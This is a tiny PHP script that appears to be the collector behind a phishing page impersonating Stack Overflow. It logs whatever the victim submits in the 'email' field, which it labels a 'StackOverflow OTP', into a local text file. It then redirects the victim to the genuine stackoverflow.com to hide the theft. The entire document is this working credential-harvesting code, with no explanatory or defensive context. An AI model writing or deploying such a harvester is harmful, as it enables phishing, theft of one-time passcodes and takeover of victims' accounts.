<?php
file_put_contents("otp.txt", "StackOverflow OTP : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://www.stackoverflow.com');
?>
